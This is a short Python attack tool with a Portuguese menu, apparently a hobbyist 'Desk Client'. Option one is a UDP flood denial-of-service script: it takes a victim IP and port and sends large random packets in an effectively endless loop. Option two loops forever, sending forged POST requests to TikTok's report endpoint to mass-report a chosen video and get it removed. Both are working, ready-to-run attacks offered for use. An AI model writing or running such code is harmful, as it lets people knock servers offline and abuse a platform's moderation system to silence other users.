import socket, random, time, http.client, json, os
from termcolor import colored
from colorama import Fore, Back, Style

def painel():
  print("""
  DESK CLIENT       

  """)
  print(Fore.RED + 'Developed by barbosa and mhzin')
  print('')

painel()
print('1 - DDOS \n2 - DERRUBAR VIDEO DE TIKTOK')
select = int(input('\nEscolha uma opção: '))

if select == 1:
  os.system('cls' if os.name == 'nt' else 'clear')
  
  painel()
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
  ip = input("Ip da Vítima: ")
  port = int(input("Porta: "))
  sleep = float(input("Tempo: "))
  
  s.connect((ip, port))
  
  for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Enviado: {i}", end='\r')
    time.sleep(sleep)
    

elif select ==2:
  os.system('cls' if os.name == 'nt' else 'clear')

  painel()
  id = input("Introduza o id do video: ")
                  

  sdoakd = "Denúncia enviada com sucesso by Desk Client v3"

  conn = http.client.HTTPSConnection("www.tiktok.com")
  payload = json.dumps({
    "reason": 1004,
    "object_id": id,
    "owner_id": id,
    "report_type": "video"
  })
  headers = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'da,en-US;q=0.7,en;q=0.3',
    'Content-Type': 'application/json',
    'Origin': 'https://www.tiktok.com',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Referer':
    f'https://www.tiktok.com/foryou?is_copy_url=1&is_from_webapp=v1&item_id={id}',
    'Connection': 'keep-alive',
    'TE': 'trailers'
  }

  while True:
      conn.request("POST", 
      "/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id=6990406517787018758&region=DK&priority_region=&os=windows&referer=&root_referer=&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=da&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows)&browser_online=true&app_language=en&timezone_name=Europe%252FCopenhagen", payload, headers)
      res = conn.getresponse()
      data = res.read()
      print("Denúncia enviada com sucesso by Desk Client v3' ")

else:
  os.system('cls' if os.name == 'nt' else 'clear')
  print('Opção Invalida!')